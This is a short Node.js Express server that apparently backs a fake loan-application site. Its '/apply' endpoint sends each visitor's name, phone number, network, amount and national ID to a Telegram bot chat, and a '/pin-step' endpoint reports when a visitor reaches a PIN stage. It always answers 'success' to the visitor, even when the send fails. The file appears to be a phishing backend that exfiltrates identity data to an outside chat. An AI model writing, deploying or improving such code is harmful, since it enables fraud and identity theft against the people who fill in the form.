const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Serve files
app.use(express.static(__dirname));

// Home
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// APPLICATION
app.post("/apply", async (req, res) => {
  const { name, phone, network, amount, nationalId } = req.body;

  const message = `
📥 NEW LOAN APPLICATION

👤 Name: ${name}
📱 Phone: ${phone}
📡 Network: ${network}
💰 Amount: ${amount}
🆔 ID: ${nationalId}
`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
    });

    res.json({ success: true });

  } catch (error) {
    console.error(error.message);
    res.json({ success: true });
  }
});

// PIN STEP
app.post("/pin-step", async (req, res) => {
  const { phone } = req.body;

  const message = `
🔐 USER REACHED PIN STEP

📱 Phone: ${phone}
`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
    });

    res.json({ success: true });

  } catch (error) {
    console.error(error.message);
    res.json({ success: true });
  }
});

// START SERVER
const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});
